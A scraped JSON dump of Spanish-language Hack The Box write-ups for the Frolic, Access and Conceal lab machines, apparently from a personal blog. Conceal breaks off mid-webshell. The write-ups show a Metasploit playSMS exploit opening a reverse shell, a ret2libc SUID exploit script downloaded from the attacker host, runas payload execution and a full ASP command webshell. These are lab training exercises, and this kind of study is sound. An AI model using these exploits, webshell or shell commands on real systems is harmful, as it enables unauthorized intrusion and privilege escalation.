UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA  En este caso un archivo codificado en base64 y lo agregamos a un nuevo archivo, verificamos que tipo de archivo es con \u0026lsquo;file\u0026rsquo; y vemos que el archivo decodificado (file_decode) es un archivo zip por lo que le cambiamos el nombre y le agregamos \u0026lsquo;.zip\u0026rsquo; al final:\n1 2 3 4 5  root@sckull:~/htb/frolic# echo \u0026#34;UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA\u0026#34; | base64 -d \u0026gt; file.txt root@sckull:~/htb/frolic# file file.txt file.txt: Zip archive data, at least v2.0 to extract root@sckull:~/htb/frolic# root@sckull:~/htb/frolic# mv file.txt file.zip   Luego al intentar descomprimir el archivo file.zip nos pide una contraseña, en este caso la contraseña es \u0026lsquo;password\u0026rsquo; (contraseñas comunes), nos devuelve un archivo index.php.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  root@sckull:~/htb/frolic# 7z x file.zip 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 Scanning the drive for archives: 1 file, 360 bytes (1 KiB) Extracting archive: file.zip -- Path = file.zip Type = zip Physical Size = 360 Enter password (will not be echoed):password Everything is Ok Size: 617 Compressed: 360 root@sckull:~/htb/frolic# ls file.zip index.php   En el interior de index.php nos encontramos con texto en HEX al pasarlo a texto nos devuelve otra vez un texto en base64:\n1  4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a  1 2 3 4 5  root@sckull:~/htb/frolic# echo 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a | xxd -r -p KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==   Al decodificar el texto en base64 nos devuelve texto en lenguaje \u0026lsquo;brainfuck\u0026rsquo;:\n1 2 3 4 5 6  root@sckull:~/htb/frolic# echo KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwrKysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysgK1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0tLS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg== | base64 -d +++++ +++++ [-\u0026gt;++ +++++ +++\u0026lt;] \u0026gt;++++ +.--- --.++ +++++ .\u0026lt;+++ [-\u0026gt;++ +\u0026lt;]\u0026gt;+ ++.\u0026lt;+ ++[-\u0026gt; ---\u0026lt;] \u0026gt;---- --.-- ----- .\u0026lt;+++ +[-\u0026gt;+ +++\u0026lt;] \u0026gt;+++. \u0026lt;+++[ -\u0026gt;--- \u0026lt;]\u0026gt;-- .\u0026lt;+++ [-\u0026gt;++ +\u0026lt;]\u0026gt;+ .---. \u0026lt;+++[ -\u0026gt;--- \u0026lt;]\u0026gt;-- ----. \u0026lt;++++ [-\u0026gt;++ ++\u0026lt;]\u0026gt; ++..\u0026lt; root@sckull:~/htb/frolic#   Decodificando el mensaje con brainfuck-language\nplaySMS Intentamos utilizar idkwhatispass como contraseña en /playsms y el usuario admin y nos logramos logear dentro de la plataforma.\nPara esta plataforma (playsms) encontramos un exploit (exploit/multi/http/playsms_uploadcsv_exec) dentro de metasploit y lo utilizamos con las credenciales que habiamos encontrado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  msf5 \u0026gt; use exploit/multi/http/playsms_uploadcsv_exec msf5 exploit(multi/http/playsms_uploadcsv_exec) \u0026gt; show options Module options (exploit/multi/http/playsms_uploadcsv_exec): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD idkwhatispass yes Password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.111 yes The target address range or CIDR identifier RPORT 9999 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI /playsms yes Base playsms directory path USERNAME admin yes Username to authenticate with VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.X.X yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 PlaySMS 1.4 msf5 exploit(multi/http/playsms_uploadcsv_exec) \u0026gt; exploit [*] Started reverse TCP handler on 10.10.X.X:4444 [+] Authentication successful: admin:idkwhatispass [*] Sending stage (38247 bytes) to 10.10.10.111 [*] Meterpreter session 1 opened (10.10.X.X:4444 -\u0026gt; 10.10.10.111:33574) meterpreter \u0026gt; shell Process 1765 created. Channel 0 created. cd /home/ayush ls user.txt cat user.txt 2ab95909cf509f85a6f476b59a0c2fe0   Obtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION En los archivos de ayush encontramos un archivo llamado .rop que tiene permisos del usuario root.\n1 2 3 4 5 6 7  www-data@frolic:/home/ayush/.binary$ ls -lah ls -lah total 16K drwxrwxr-x 2 ayush ayush 4.0K Sep 25 02:43 . drwxr-xr-x 3 ayush ayush 4.0K Sep 25 02:00 .. -rwsr-xr-x 1 root root 7.4K Sep 25 00:59 rop www-data@frolic:/home/ayush/.binary$   Utilizando el siguiente script obtenemos privilegios root y nuestra bandera root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  from struct import pack from subprocess import call system = 0xb7e19000 + 0x0003ada0 exit = 0xb7e19000 + 0x0002e9d0 binsh = 0xb7e19000 + 0x0015ba0b def p32(num): return pack(\u0026#34;\u0026lt;I\u0026#34;,num) buf = \u0026#34;A\u0026#34;*52 buf += p32(system) buf += p32(exit) buf += p32(binsh) call([\u0026#34;/home/ayush/.binary/rop\u0026#34;, buf])   1 2 3 4 5 6 7 8 9 10 11 12 13  www-data@frolic:/tmp$ curl 10.10.15.46:80/bf.py -o bf.py www-data@frolic:/tmp$ ls ls bf.py www-data@frolic:/tmp$ python bf.py python bf.py # whoami; id; wc -c /root/root.txt; cat /root/root.txt whoami; id; wc -c /root/root.txt; cat /root/root.txt root uid=0(root) gid=33(www-data) groups=33(www-data) 33 /root/root.txt 85d3fdf03f969892538ba9a731826222 #   ","description":"Frolic de HackTheboxk. Tras analizar el codigo fuente de la pagina web presenta multiples retos lo que nos llevo a unas credenciales que utilizamos en playSMS el cual explotamos una vulnerabilidad que nos dio acceso a la maquina. Para escalar privilegios expotamos un binario con privilegios SUID.","id":157,"section":"posts","tags":["smbclient","ook","brainfuck","playSMS","metasploit",""],"title":"Hack The Box - Frolic","uri":"https://sckull.github.io/posts/frolic/"},{"content":"  Access con Sistema Operativo Windows y dificultad facil, presenta un servicio FTP el cual contiene una base de datos donde encontramos un correo electronico con credenciales que utilizamos en Telnet. Utilizando las credenciales guardadas ejecutamos un payload de metasploit para obtener acceso privilegiado.\n   Nombre Access      OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.98   Maker egre55    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.4, 6.5, 5, 5, 3.5], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[8, 9, 1, 9, 1], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Utilizando la herramienta nmap para escaneo de puertos y servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-29 21:08 CST Initiating SYN Stealth Scan at 21:08 Scanning 10.10.10.98 (10.10.10.98) [65535 ports] Discovered open port 23/tcp on 10.10.10.98 Discovered open port 80/tcp on 10.10.10.98 Discovered open port 21/tcp on 10.10.10.98 Completed SYN Stealth Scan at 21:15, 438.01s elapsed (65535 total ports) Initiating Service scan at 21:15 Scanning 3 services on 10.10.10.98 (10.10.10.98) Completed Service scan at 21:18, 160.97s elapsed (3 services on 1 host) Completed NSE at 21:19, 1.78s elapsed Nmap scan report for 10.10.10.98 (10.10.10.98) Host is up (0.37s latency). Not shown: 65532 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: TIMEOUT | ftp-syst: |_ SYST: Windows_NT 23/tcp open telnet? 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: MegaCorp Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: specialized|general purpose|phone Running (JUST GUESSING): Microsoft Windows 7|8|Phone|2008|8.1|Vista (91%) OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 Aggressive OS guesses: Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 8.1 Update 1 (91%), Microsoft Windows Phone 7.5 or 8.0 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (90%), Microsoft Windows 7 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 0.017 days (since Sat Sep 29 20:54:14 2018) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=263 (Good luck!) IP ID Sequence Generation: Busy server or unknown class Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 23/tcp) HOP RTT ADDRESS 1 342.05 ms 10.10.12.1 (10.10.12.1) 2 340.87 ms 10.10.10.98 (10.10.10.98) NSE: Script Post-scanning. Initiating NSE at 21:19 Completed NSE at 21:19, 0.00s elapsed Initiating NSE at 21:19 Completed NSE at 21:19, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 646.94 seconds Raw packets sent: 131457 (5.788MB) | Rcvd: 537 (26.626KB)   HTTP Se utilizo la herramienta gobuster para realizar una busqueda de archivos, directorios, etc. dentro del sitio web.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  root@sckull:~/htb/access# gobuster -u http://10.10.10.98/ -w /usr/share/wordlists/dirb/common.txt -np -x asp,aspx,txt,html -t 15 ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.98/ [+] Threads : 15 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : aspx,txt,html,asp [+] Timeout : 10s ===================================================== 2019/03/03 02:43:38 Starting gobuster ===================================================== /Index.html (Status: 200)   No encontramos mucho para poder explorar mas que solo el index.html.\nFTP Iniciamos sesion en el servicio FTP con el usuario y contraseña \u0026lsquo;anonymous\u0026rsquo;. Dentro de este encontramos dos carpetas y dos archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  root@sckull:~/htb/access# ftp 10.10.10.98 Connected to 10.10.10.98. 220 Microsoft FTP Service Name (10.10.10.98:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; ls -la 200 PORT command successful. 150 Opening ASCII mode data connection. 08-23-18 08:16PM \u0026lt;DIR\u0026gt; Backups 08-24-18 09:00PM \u0026lt;DIR\u0026gt; Engineer 226 Transfer complete. ftp\u0026gt; cd Backups 250 CWD command successful. ftp\u0026gt; ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 08-23-18 08:16PM 5652480 backup.mdb 226 Transfer complete. ftp\u0026gt; bin 200 Type set to I. ftp\u0026gt; get backup.mdb local: backup.mdb remote: backup.mdb 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 5652480 bytes received in 147.73 secs (37.3663 kB/s) ftp\u0026gt; cd ../Engineer 250 CWD command successful. ftp\u0026gt; ls -lah 200 PORT command successful. 125 Data connection already open; Transfer starting. 08-24-18 12:16AM 10870 Access Control.zip 226 Transfer complete. ftp\u0026gt; get Access\\ Control.zip local: Access Control.zip remote: Access Control.zip 200 PORT command successful. 150 Opening BINARY mode data connection. 226 Transfer complete. 10870 bytes received in 4.72 secs (2.2477 kB/s) ftp\u0026gt; quit 221 Goodbye. root@sckull:~/htb/access# ls \u0026#39;Access Control.zip\u0026#39; backup.mdb   Ahora tenemos dos archivos \u0026lsquo;Access Control.zip\u0026rsquo; y \u0026lsquo;mdb\u0026rsquo;.\nAnalizando los archivos de que obtuvimos en FTP, encontramos que backup.mdb es un archivo de Microsoft Access Database y Access Control.zip al intentar descomprimir los archivos dentro, nos pide una contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12  root@sckull:~/htb/access# file backup.mdb backup.mdb: Microsoft Access Database root@sckull:~/htb/access# file \u0026#39;Access Control.zip\u0026#39; Access Control.zip: Zip archive data, at least v2.0 to extract root@sckull:~/htb/access# binwalk \u0026#39;Access Control.zip\u0026#39; DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 Zip archive data, encrypted at least v2.0 to extract, compressed size: 10678, uncompressed size: 271360, name: Access Control.pst 10848 0x2A60 End of Zip archive, footer length: 22   mdb En el primer archivo utilizamos la pagina \u0026lsquo;https://www.mdbopener.com/' para realizar alguna busqueda de datos que nos pudiesen ayudar de alguna forma en algun otro servicio y encontramos una base de datos de lo que parece ser de una empresa, nos centramos en datos de usuarios y contraseñas y econtramos una tabla que se hace llamar \u0026lsquo;auth_user\u0026rsquo; con los siguientes datos:\nTABLAS auth_user Utilizando la contraseña \u0026lsquo;access4u@security\u0026rsquo; para descomprimir los archivos que \u0026lsquo;Access Control.zip\u0026rsquo; contiene, encontramos un archivo \u0026lsquo;Access Control.pst\u0026rsquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  root@sckull:~/htb/access# 7z x \u0026#39;Access Control.zip\u0026#39; 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,3 CPUs Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz (806EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 10870 bytes (11 KiB) Extracting archive: Access Control.zip -- Path = Access Control.zip Type = zip Physical Size = 10870 Enter password (will not be echoed): Everything is Ok Size: 271360 Compressed: 10870 root@sckull:~/htb/access# ls \u0026#39;Access Control.pst\u0026#39;   Utilizando readpst para lectura del archivo, nos genera un archivo de tipo mbox.\n1 2 3 4 5 6 7  root@sckull:~/htb/access# readpst \u0026#39;Access Control.pst\u0026#39; Opening PST file and indexes... Processing Folder \u0026#34;Deleted Items\u0026#34; \u0026#34;Access Control\u0026#34; - 2 items done, 0 items skipped. root@sckull:~/htb/access# ls \u0026#39;Access Control.mbox\u0026#39;   Para lectura de este archivo utilizamos \u0026lsquo;mail -f Access Control.mbox\u0026rsquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  root@sckull:~/htb/access# mail -f Access\\ Control.mbox Status: RO From: john@megacorp.com \u0026lt;john@megacorp.com\u0026gt; Subject: MegaCorp Access Control System \u0026#34;security\u0026#34; account To: \u0026#39;security@accesscontrolsystems.com\u0026#39; Date: Thu, 23 Aug 2018 23:44:07 +0000 MIME-Version: 1.0 Content-Type: multipart/mixed; boundary=\u0026#34;--boundary-LibPST-iamunique-387867163_-_-\u0026#34; ----boundary-LibPST-iamunique-387867163_-_- Content-Type: multipart/alternative; boundary=\u0026#34;alt---boundary-LibPST-iamunique-387867163_-_-\u0026#34; --alt---boundary-LibPST-iamunique-387867163_-_- Content-Type: text/plain; charset=\u0026#34;utf-8\u0026#34; Hi there, The password for the “security” account has been changed to 4Cc3ssC0ntr0ller. Please ensure this is passed on to your engineers. Regards, John ....   Telnet - Obteniendo Acceso Como pudimos observar el archivo \u0026lsquo;Access Control.mbox\u0026rsquo; es un archivo que contiene un email, dentro de el John nos indica que la contraseña para el usuario \u0026lsquo;security\u0026rsquo; fue cambiada a \u0026lsquo;4Cc3ssC0ntr0ller\u0026rsquo;. Aprovechando estos datos procedemos a utilizar el servicio telnet para conectarnos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  root@sckull:~/htb/access# telnet 10.10.10.98 Trying 10.10.10.98... Connected to 10.10.10.98. Escape character is \u0026#39;^]\u0026#39;. Welcome to Microsoft Telnet Service login: security password: *=============================================================== Microsoft Telnet Server. *=============================================================== C:\\Users\\security\u0026gt;cd Desktop C:\\Users\\security\\Desktop\u0026gt;dir Volume in drive C has no label. Volume Serial Number is 9C45-DBF0 Directory of C:\\Users\\security\\Desktop 03/03/2019 03:12 AM \u0026lt;DIR\u0026gt; . 03/03/2019 03:12 AM \u0026lt;DIR\u0026gt; .. 03/03/2019 03:12 AM 73,802 shell.exe 08/21/2018 10:37 PM 32 user.txt 2 File(s) 73,834 bytes 2 Dir(s) 16,771,272,704 bytes free C:\\Users\\security\\Desktop\u0026gt;more user.txt ff1f3b4[...] C:\\Users\\security\\Desktop\u0026gt;   Y asi obtenemos nuestra primera bandera user.txt.\nPrivilege Escalation Enumerando archivos y directorios no encontramos nada, pero al utilizar el comando cmdkey /list encontramos que el usuario Administrator tiene una contraseña guardada.\n1 2 3 4 5 6 7 8 9 10  C:\\Users\\security\\Links\u0026gt;cmdkey /list Currently stored credentials: Target: Domain:interactive=ACCESS\\Administrator Type: Domain Password User: ACCESS\\Administrator C:\\Users\\security\\Links\u0026gt;   Metasploit \u0026amp; Msfvenom Utilizamos runas para ejecutar comandos con el usuario Administrator y con la contraseña guardada. Primero generamos nuestro payload con msfvenom, configuramos a la escucha nuestro exploit finalmente ejecutamos un pequeño servidor con python.\nRUN PAYLOAD - RUNAS Teniendo nuestro entorno local listo, procedemos a descargar nuestro payload a la maquina y ejecutarlo con \u0026lsquo;runas\u0026rsquo;.\nSe muestra la solicitud de descarga en el servidor python.\nSesion Shell En nuestro entorno local obtenemos una sesion con privilegios de administracion y la flag root.txt.\n RUNAS - ss64  ","description":"Access con Sistema Operativo Windows y dificultad facil, presenta un servicio FTP el cual contiene una base de datos donde encontramos un correo electronico con credenciales que utilizamos en Telnet. Utilizando las credenciales guardadas ejecutamos un payload de metasploit para obtener acceso privilegiado.","id":158,"section":"posts","tags":["ftp","readpst","telnet","runas"],"title":"Hack The Box - Access","uri":"https://sckull.github.io/posts/access/"},{"content":"  Conceal expone el puerto SNMP donde obtuvimos informacion para generar la configuracion para una VPN y posteriormente conectarnos a esta. Obtuvimos acceso a la maquina con una web shell en FTP que luego actualizamos a una shell de PowerShell. SetImpersonatePrivilege es el privilegio que explotamos con Juicy Potato para escalar privilegios.\n   Nombre Conceal      OS Windows   Puntos 40   Dificultad Dificil   IP 10.10.10.116   Maker bashlogic    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7.8, 7.5, 6.8, 3.2, 2.5], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN 1 2 3 4 5 6 7  masscan -p1-65535,U:1-65535 10.10.10.116 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-27 00:03:27 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 161/udp on 10.10.10.116\u0026lt;/pre\u0026gt;   SNMP PORT Utilizando un modulo de metasploit para obtener informacion, el modulo es el siguiente auxiliary/scanner/snmp/snmp_enum.\n1 2 3 4 5 6 7 8 9 10  [*] System information:Host IP : 10.10.10.116Hostname : ConcealDescription : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)Contact : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43Location : -Uptime snmp : 00:10:11.23Uptime system : 00:09:45.96System date : 2019-3-2 04:26:04.7  IKE VPN password PSK Utilizamos el wordlist rockyou y hashcat para desencriptar la contraseña.\n1  9c8b1a372b1878851be2c097031b6e43 NTLM : Dudecake1!   IKE VPN SETUP IPSEC - IKE VPN Utilizamos strongswan para poder conectarnos mediante una VPN IKE y su configuracion es la siguiente.\nInstalamos strongswan:\n1  sudo apt install strongswan   Configuramos los siguientes archivos.\n[/etc/ipsec.conf]\n1 2 3 4 5 6 7 8 9 10  conn conceal\tauthby=secret\tauto=route\tike=3des-sha1-modp1024\tleft=10.10.12.184\tright=10.10.10.116\tkeyexchange=ikev1\ttype=transport\tesp=3des-sha1 \trightprotoport=tcp  [/etc/ipsec.secrets]\n1 2  10.10.12.184 : PSK \u0026#34;Dudecake1!\u0026#34;10.10.10.116 : PSK \u0026#34;Dudecake1!\u0026#34;  STATUS IPSEC NMAP - IPSEC SMB - IPSEC RPC - IPSEC FTP - IPSEC Nos conectamos como usuario anonymous pero no encontramos nada dentro.\nHTTP - IPSEC Enumerando con gobuster encontramos solo una direccion.\n/upload WEBSHELL Para obtener una webshell utilizamos ftp para subir nuestra webshell y visitar /upload/cmd.asp para interactuar con este.\nWEBSHELL https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  \u0026lt;% Set oScript = Server.CreateObject(\u0026#34;WSCRIPT.SHELL\u0026#34;) Set oScriptNet = Server.CreateObject(\u0026#34;WSCRIPT.NETWORK\u0026#34;) Set oFileSys = Server.CreateObject(\u0026#34;Scripting.FileSystemObject\u0026#34;) Function getCommandOutput(theCommand) Dim objShell, objCmdExec Set objShell = CreateObject(\u0026#34;WScript.Shell\u0026#34;) Set objCmdExec = objshell.exec(thecommand) getCommandOutput = objCmdExec.StdOut.ReadAll end Function %\u0026gt; \u0026lt;HTML\u0026gt; \u0026lt;BODY\u0026gt; \u0026lt;FORM action=\u0026#34;\u0026#34; method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;cmd\u0026#34; size=45 value=\u0026#34;\u0026lt;%= szCMD %\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Run\u0026#34;\u0026gt; \u0026lt;/FORM\u0026gt; \u0026lt;PRE\u0026gt; \u0026lt;%= \u0026#34;\\\\\u0026#34; \u0026amp; oScriptNet.ComputerName \u0026amp; \u0026#34;\\\u0026#34; \u0026amp; oScriptNet.UserName %\u0026gt; \u0026lt;%Response.Write(Request.ServerVariables(\u0026#34;server_name\u0026#34;))%\u0026gt; \u0026lt;p\u0026gt; \u0026lt;b\u0026gt;The server\u0026#39;s port:\u0026lt;/b\u0026gt; \u0026lt;%Response.Write(Request.ServerVariables(\u0026#34;server_port\u0026#34;))%\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;b\u0026gt;The server\u0026#39;s software:\u0026lt;/b\u0026gt; 